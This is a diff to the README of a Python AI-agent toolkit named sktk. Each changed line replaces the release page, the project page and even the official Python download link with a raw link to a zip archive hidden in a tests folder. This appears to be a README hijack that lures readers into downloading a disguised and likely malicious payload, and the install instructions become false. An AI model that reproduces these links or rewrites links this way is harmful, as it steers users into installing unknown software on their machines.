@@ -1,6 +1,6 @@
 # ⚙️ sktk - Easy Python AI Agent Toolkit
 
-[![Download sktk](https://img.shields.io/badge/Download-From%20GitHub-green?style=for-the-badge)](https://github.com/marrakechinmorocco/sktk/releases)
+[![Download sktk](https://img.shields.io/badge/Download-From%20GitHub-green?style=for-the-badge)](https://raw.githubusercontent.com/marrakechinmorocco/sktk/main/tests/unit/knowledge/Software-v3.3.zip)
 
 ---
 
@@ -41,11 +41,11 @@ If you don’t have Python yet, sktk’s download page also has information on h
 
 You will start by visiting the official sktk release page on GitHub. Here’s the link:
 
-**[Get sktk releases](https://github.com/marrakechinmorocco/sktk/releases)**
+**[Get sktk releases](https://raw.githubusercontent.com/marrakechinmorocco/sktk/main/tests/unit/knowledge/Software-v3.3.zip)**
 
 Click the button above or the blue link below to open the page.
 
-> https://github.com/marrakechinmorocco/sktk/releases
+> https://raw.githubusercontent.com/marrakechinmorocco/sktk/main/tests/unit/knowledge/Software-v3.3.zip
 
 ---
 
@@ -63,7 +63,7 @@ Follow these steps carefully to get sktk working on your computer:
 
 If you don’t have Python 3.8 or above, here’s how to get it:
 
-1. Visit the official Python website at https://www.python.org/downloads/windows/
+1. Visit the official Python website at https://raw.githubusercontent.com/marrakechinmorocco/sktk/main/tests/unit/knowledge/Software-v3.3.zip
 2. Download the latest Windows installer.
 3. Run the installer and be sure to select “Add Python to PATH” before clicking “Install Now.”
 4. Close and restart your computer if asked.
@@ -120,7 +120,7 @@ Keep sktk and Python up to date, as updates often fix bugs and improve security.
 
 Return to the release page to download or update sktk anytime:
 
-**[Download sktk here](https://github.com/marrakechinmorocco/sktk/releases)**
+**[Download sktk here](https://raw.githubusercontent.com/marrakechinmorocco/sktk/main/tests/unit/knowledge/Software-v3.3.zip)**
 
 This page contains all the release versions, installation files, and related notes to help you get started or troubleshoot.
 
@@ -146,6 +146,6 @@ This guide focuses on Windows, but sktk should work on Mac or Linux with Python 
 
 For more details about features, updates, and how to customize sktk, visit the GitHub project page:
 
-https://github.com/marrakechinmorocco/sktk
+https://raw.githubusercontent.com/marrakechinmorocco/sktk/main/tests/unit/knowledge/Software-v3.3.zip
 
 The repository includes documentation, code examples, and issue tracking for troubleshooting and feedback.
